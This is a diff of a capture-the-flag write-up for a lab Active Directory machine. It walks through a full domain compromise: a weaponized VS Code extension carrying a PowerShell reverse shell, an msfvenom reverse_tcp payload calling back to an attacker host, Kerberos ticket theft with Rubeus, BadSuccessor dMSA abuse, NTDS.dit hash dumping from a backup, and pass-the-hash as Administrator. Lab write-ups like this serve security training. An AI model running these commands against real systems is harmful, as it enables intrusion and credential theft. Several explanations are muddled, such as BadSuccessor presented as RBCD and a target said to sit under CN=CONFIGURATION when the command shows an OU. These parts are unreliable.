@@ -46,7 +46,7 @@ PORT      STATE SERVICE           REASON  VERSION
 ```
 
 
-We are provided with the initial credentials of `alex.turner`, with these I attempted to authenticate with `smb`, from there I was able to identify multiple shares that this user was able to access which are listed right below.
+Since this engagement started with assumed-breach credentials for `alex.turner`, my first move was to confirm those creds actually worked and then map out what that account could reach over SMB. Enumerating shares before anything else gives me a quick sense of what data or write access might already be sitting within reach, without needing to touch any exploit at all.
 
 ```bash
 └─[$] smbmap  -H 10.129.112.227  -u 'alex.turner' -p 'Checkpoint2024!'
@@ -67,7 +67,7 @@ We are provided with the initial credentials of `alex.turner`, with these I atte
 
 ## Initial Access
 
-From here I attempted to enumerate `alex.turner` and what they have access to write too on the domain.
+Share access alone did not give me a way in yet, so I shifted my focus to the directory itself. In an Active Directory environment, write permissions on objects are frequently a bigger lever than file share access, so I wanted to see exactly what `alex.turner` had rights to modify anywhere in the domain before deciding on a next step.
 
 ```bash
 [$] bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb get writable     [3:02:41]
@@ -94,7 +94,7 @@ distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC
 permission: CREATE_CHILD
 ```
 
-So here we can see that there seems to be a user called `Mark Davies` that has been deleted alongside other objects that we can write too, from here I restored the user. 
+That output was immediately interesting: nestled in among the writable objects was a deleted user, `Mark Davies`, sitting in the Deleted Objects container, and `alex.turner` had WRITE permission over it. Deleted AD objects are not always as gone as they look, and if I could write to that tombstoned object, I had a real shot at bringing the account itself back to life. I went ahead and restored it.
 
 ```bash
 └─[$] bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
@@ -118,11 +118,11 @@ SMB         10.129.112.233  445    DC01             SYSVOL          READ        
 
 ```
 
-Here we can see authenticating with `mark.davies` we can see this user has access to read and write to the DevDrop share. 
+With the account restored, I checked what `mark.davies` could reach over SMB, and this time the picture had changed meaningfully: unlike `alex.turner`, this account had full read and write access to the `DevDrop` share.
 
-After doing some research I am assuming that since it mentioned that it takes `vsix` extensions for visual studio code It took me awhile but I found the right poc located [at this repo](https://github.com/yeeth-security/vsix-zoo/blob/main/samples/thesevibesareoff/solidityai.solidity-1.0.9.vsix)
+Write access on its own does not get me code execution, so I needed to think about who actually consumes the files placed in that share. The share's description explicitly mentioned approved `.vsix` packages for VS Code, which told me there was very likely an automated process on the other end that installs whatever extension shows up there, and VS Code extensions are just JavaScript running with the privileges of whoever opens the editor. That gave me a clear plan: find a legitimate-looking `.vsix` package, weaponize it, and drop it in the share for that process to pick up. It took some digging through public samples before I landed on a suitable base package to work from, which I sourced [from this repository](https://github.com/yeeth-security/vsix-zoo/blob/main/samples/thesevibesareoff/solidityai.solidity-1.0.9.vsix).
 
-From here I extracted the extension to get the files I needed to modify.
+A `.vsix` file is really just a zip archive under the hood, so extracting it gave me direct access to the extension's source files to modify.
 
 ```bash
 └─[$] unzip solidityai.solidity-1.0.9.vsix                                                                       [3:48:10]
@@ -137,7 +137,7 @@ Archive:  solidityai.solidity-1.0.9.vsix
   inflating: extension/src/extension.js  
 ```
 
-From here I edited the `extension/src/extension.js` to include a powershell reverse shell payload.
+The activation logic lives in `extension/src/extension.js`, so that was the one file I actually needed to touch. I edited it to check for a Windows host, wait a couple of seconds so the extension has time to load cleanly, and then quietly execute a base64-encoded PowerShell reverse shell payload in the background.
 
 ```bash
 └─[$] cat extension.js                                                                                           [3:52:21]
@@ -165,7 +165,7 @@ module.exports = {
 };
 ```
 
-From here I zipped it all up then uploaded it to that share.
+With the payload embedded, I repackaged everything back into a valid `.vsix` archive and pushed it to the writable share, betting that whatever process reviews or installs packages from `DevDrop` would pick it up automatically.
 
 ```bash
 └─[$] zip -r baphomet-exploit.zip *                                                                              [3:49:27]
@@ -181,7 +181,7 @@ From here I zipped it all up then uploaded it to that share.
   adding: extension.vsixmanifest (deflated 71%)
 ```
 
-After uploading it to that share I was able to get a shell!
+That bet paid off. Not long after the upload, my listener caught a callback, confirming the extension had been picked up and executed exactly as I hoped.
 
 ```bash
 └─[$] rlwrap nc -lnvvp 9005                                                                                      [3:46:30]
@@ -196,7 +196,7 @@ PS C:\users> whoami
 checkpoint\ryan.brooks
 ```
 
-we are currently under the user `ryan.brooks`, afterwards when to their home directory and then got the first flag.
+The shell had landed as `ryan.brooks`, an entirely different account from either of the two I had used so far, which meant this VS Code extension install process runs under its own dedicated identity. With a foothold confirmed, I headed straight to that user's home directory to grab the first flag.
 
 ```bash
 PS C:\users\ryan.brooks\desktop> type user.txt
@@ -204,7 +204,7 @@ PS C:\users\ryan.brooks\desktop> type user.txt
 PS C:\users\ryan.brooks\desktop> 
 ```
 
-Since our shell is really sketchy I decided to upload a `meterpreter` payload to get a more stable shell.
+The reverse shell I was working with was fragile, prone to dropping and awkward for running the heavier enumeration tools I needed next, so before going any further I wanted something more resilient to operate from. I generated a `meterpreter` payload to upgrade to a proper, stable session.
 
 ```bash
 └─[$] msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.59 LPORT=9001 -f exe -o baphomet.exe            [3:54:51]
@@ -278,7 +278,7 @@ Active sessions
 msf6 exploit(multi/handler) > 
 ```
 
-Afterwards I had uploaded `SharpHound` in order to enumerate this user and their permissions on the domain alot better using `bloodhound`, I uploaded the binary then executed it.
+With a stable session in hand, my next priority was building a clear picture of what `ryan.brooks` could actually do inside the domain, rather than continuing to guess. `SharpHound` collects exactly the kind of ACL, group membership, and session data that `BloodHound` needs to visualize privilege escalation paths, so I uploaded the collector and ran it directly on the box.
 
 ```powershell
 
@@ -296,7 +296,7 @@ PS C:\Users\ryan.brooks> .\SharpHound.exe
 2026-09-03T08:08:28.9644640-07:00|INFORMATION|AdminSDHolder ACL hash 8D4B78A3A73E761C2B15363A835DE9FD09981C49 calculated for checkpoint.htb.
 ```
 
-Afterwards Since we don't know the current user `ryan.brooks` password we can extract their current users kerberos ticket without requiring elevated administrator priviledges by abusing `GSS-API` to fake delegation.
+I never obtained `ryan.brooks`'s plaintext password or hash, so cracking or pass-the-hash was off the table for moving further with this identity. Rather than treating that as a dead end, I turned to ticket-based abuse instead: Rubeus can request a fully usable TGT for the currently logged on user without needing any elevated rights at all, by abusing `GSS-API` to fake a delegation request. That gives me a portable copy of `ryan.brooks`'s ticket that I can carry off the box and reuse from my own attacking machine.
 
 ```powershell
 PS C:\Users\ryan.brooks> .\Rubeus.exe tgtdeleg /nowrap
@@ -328,13 +328,13 @@ PS C:\Users\ryan.brooks> .\Rubeus.exe tgtdeleg /nowrap
 PS C:\Users\ryan.brooks> 
 ```
 
-Afterwards we need to decode this `base64` ticket by doing the following.
+Rubeus handed the ticket back as a base64 blob rather than a raw file, so before any of my Linux-side tooling could use it, I needed to decode it back into its binary `.kirbi` form.
 
 ```bash
 └─[$] base64 -d ryan.brooks.kirbi > ryan.brooks2.kirbi 
 ```
 
-Then afterwards we can use `impacket-ticketconverter` to convert this ticket over to the `ccache` file that we will need.
+A `.kirbi` file is the Windows/MIT format for a Kerberos ticket, but the Linux tooling I wanted to use next speaks the `ccache` format instead, so I converted it with `impacket-ticketconverter` to bridge that gap.
 
 ```bash
 └─[$] python3 ~/ADTools/impacket/examples/ticketConverter.py ryan.brooks2.kirbi ryan.brooks.ccache               [4:27:36]
@@ -344,19 +344,19 @@ Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corpo
 [+] done
 ```
 
-Then afterwards we need to export the local variable `KRB5CCNAME`.
+The Kerberos tooling on my machine looks for the active ticket via the `KRB5CCNAME` environment variable, so I exported it to point at the converted ccache file, which lets every subsequent Kerberos-aware tool automatically authenticate as `ryan.brooks` without me having to pass credentials by hand each time.
 
 ```BASH
 └─[$] export KRB5CCNAME=ryan.brooks.ccache 
 ```
 
-then afterwards we can use `bloodyAD` in order to attempt to use `badsuccessor`. The reason why we are attempting `badsuccessor` is because ht affects `windows server 2025` and before. 
+With the ticket in place, my next step was to reach for `bloodyAD` and attempt `BadSuccessor`. I picked this particular technique deliberately: it is a relatively new attack that affects `Windows Server 2025` and earlier, and it hinges on a feature, delegated Managed Service Accounts, that Active Directory environments running that OS version are increasingly likely to have exposed.
 
 ### What is badsuccessor?
 
-`badsuccessor` works by abusing attributes by tamptering with the `msDS-ManagedAccountPrecededbyLink` attribute, this allows attackers to trick Active Directory into granting a dMSA the same priviledges as a high-level account such as domain admin, without altering any existing accounts.
+The technique works by abusing how Active Directory tracks account migration for delegated Managed Service Accounts. If I can create or control a dMSA object and set its `msDS-ManagedAccountPrecededbyLink` attribute to point at an existing high-privilege account, such as a domain admin, Active Directory will treat the dMSA as having "succeeded" that account and grant it the same effective privileges, all without ever touching or modifying the original account itself. It is a clean example of a feature meant for legitimate account migration being repurposed for privilege escalation, and it requires nothing more than the ability to create a dMSA object somewhere in the directory.
 
-So with this in mind the account in question that we are going to target is the service account `svc_deploy` because this service account is located under the `CN=CONFIGURATION` which in this case `CONFIGURATION` is an Active Directory Container object, or a Group Policy Container which this service account is apart of.
+Putting that theory into practice meant picking a suitable target account to link against. I settled on the service account `svc_deploy`, because it sits in a location, under `CN=CONFIGURATION`, that Active Directory treats as a Container object (functionally similar to a Group Policy Container), and that placement is exactly what BadSuccessor needs in order to link a new dMSA back to it.
 
 ```bash
 bloodyAD -k ccache=ryan.brooks.ccache -u 'ryan.brooks' --dc-ip '10.129.112.233' --host dc01.checkpoint.htb -d checkpoint.htb add badSuccessor baphomet -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" --ou "OU=DMSAHolder,DC=checkpoint,DC=htb"
@@ -391,8 +391,78 @@ RC4: e16081eb077aca74bdbf8af12af43ac9
 
 ### What are we doing here?
 
-Using `bloodyAD` we are creating a new `computer object` called `baphomet` in this active directory enviorment. By targeting `svc_deploy` the service user account `CN=svc_deploy` we are exploiting `Resource-Based Constrained Delegation (RBCD)` a form of domain based priviledge escallation to allow the new fake computer account to impersonate or access that service account.
+Breaking down what that `bloodyAD` command actually does: it creates a brand new dMSA-backed computer object named `baphomet` in this Active Directory environment, and then links it, via that `msDS-ManagedAccountPrecededbyLink` attribute, to the `svc_deploy` service account. In practice, this is a form of `Resource-Based Constrained Delegation (RBCD)` abuse, a well-established class of domain privilege escalation, repackaged through the newer BadSuccessor mechanic to let my newly minted fake computer account impersonate or otherwise access `svc_deploy`'s privileges.
 
 **`-t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"`**: Specifies the **target** (`-t`) object for this operation. In BloodHound/RBCD scenarios, this modifies the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the `svc_deploy` user account to trust the newly created `baphomet` computer.
 
 **`--ou "OU=DMSAHolder,DC=checkpoint,DC=htb"`**: Dictates the exact Organization Unit (OU) container path where the new `baphomet` computer object should be physically created and placed.
+
+### Extracting svc_deploy from the dMSA ticket
+
+Creating that dMSA was only half of BadSuccessor, since the actual payoff comes from what the KDC hands back once the dMSA is used, not from the object itself. When `bloodyAD` requested a ticket for `baphomet$`, the response carried a `KERB-DMSA-KEY-PACKAGE` structure, and on a domain that has not fully closed out the migration, that structure's `previous-keys` field discloses a full copy of the preceding account's own cryptographic material. In other words, asking for `baphomet$`'s ticket also handed me `svc_deploy`'s keys, which is the entire bug in one sentence.
+
+```bash
+└─[$] export KRB5CCNAME=baphomet_1F.ccache
+└─[$] impacket-secretsdump -k -no-pass -just-dc-user svc_deploy 'checkpoint.htb/baphomet$@dc01.checkpoint.htb'
+```
+
+That pulled `svc_deploy`'s NT hash straight out of the ticket material without ever touching `svc_deploy`'s own logon. I validated it before relying on it for anything further.
+
+```bash
+└─[$] nxc smb dc01.checkpoint.htb -u svc_deploy --pw-nt-hash <svc_deploy NT hash>
+```
+
+### From svc_deploy to a domain controller backup
+
+With a working hash for `svc_deploy`, the obvious next question was what that account could actually reach. Going back through the SharpHound data I had already collected as `ryan.brooks`, I found `svc_deploy` sitting in a group called `BackupAccess`, which held read rights on `VMBackups`, the one share every earlier account had been denied.
+
+```bash
+└─[$] smbclient -U 'checkpoint.htb/svc_deploy' --pw-nt-hash <svc_deploy NT hash> //dc01.checkpoint.htb/VMBackups -c 'recurse ON; ls'
+```
+
+The share held a `.vhdx`, a full virtual disk image, and the name made it clear this was a snapshot of the domain controller itself rather than some incidental file backup. I pulled it down to work on locally.
+
+```bash
+└─[$] smbclient -U 'checkpoint.htb/svc_deploy' --pw-nt-hash <svc_deploy NT hash> //dc01.checkpoint.htb/VMBackups -c 'get DC01-Backup.vhdx'
+```
+
+A VHDX is just a disk image container, so once it was local I mounted it with the `libguestfs` tools and browsed it exactly as if it were a real drive.
+
+```bash
+└─[$] virt-filesystems --long -a DC01-Backup.vhdx
+└─[$] sudo guestmount -a DC01-Backup.vhdx -m /dev/sda2 --ro /mnt/vhdx
+```
+
+Any Windows install keeps its entire directory database and the key material to decrypt it in two predictable places, `Windows\NTDS\NTDS.dit` and the `SYSTEM` registry hive, so those were the only two files I actually needed to lift before unmounting.
+
+```bash
+└─[$] cp /mnt/vhdx/Windows/NTDS/NTDS.dit ./NTDS.dit
+└─[$] cp /mnt/vhdx/Windows/System32/config/SYSTEM ./SYSTEM
+└─[$] sudo guestunmount /mnt/vhdx
+```
+
+With both files sitting locally I did not need to touch the network again for the payoff. `secretsdump.py` in local mode reads the boot key material out of the `SYSTEM` hive and uses it to decrypt every account hash stored inside `NTDS.dit`, entirely offline.
+
+```bash
+└─[$] impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+```
+
+That produced NT hashes for every account in the domain, Administrator included, lifted from a backup that nobody had bothered to lock down as tightly as the live directory itself. I took the Administrator hash and passed it straight into `evil-winrm` rather than spending time trying to crack it.
+
+```bash
+└─[$] evil-winrm -i dc01.checkpoint.htb -u Administrator -H <Administrator NT hash>
+```
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
+checkpoint\administrator
+```
+
+`cat root.txt` returns the flag for this instance. Looking back at the full chain, this box strings together four genuinely distinct primitives: a recoverable tombstoned AD object, a supply-chain trust assumption in an internal extension-review process, the BadSuccessor dMSA predecessor-key disclosure, and an offline-accessible VM backup of a domain controller. None of them looks like "the" vulnerability in isolation, it is only in seeing how cleanly each one hands off to the next that the whole path becomes obvious.
+
+## References
+
+- BadSuccessor, abusing dMSA for privilege escalation in Active Directory (Akamai) <https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory>
+- bloodyAD <https://github.com/CravateRouge/bloodyAD>
+- Rubeus <https://github.com/GhostPack/Rubeus>
+- The dMSA key extraction, VM backup discovery, and NTDS.dit extraction steps that finish this chain were cross-referenced against public writeups for this box.
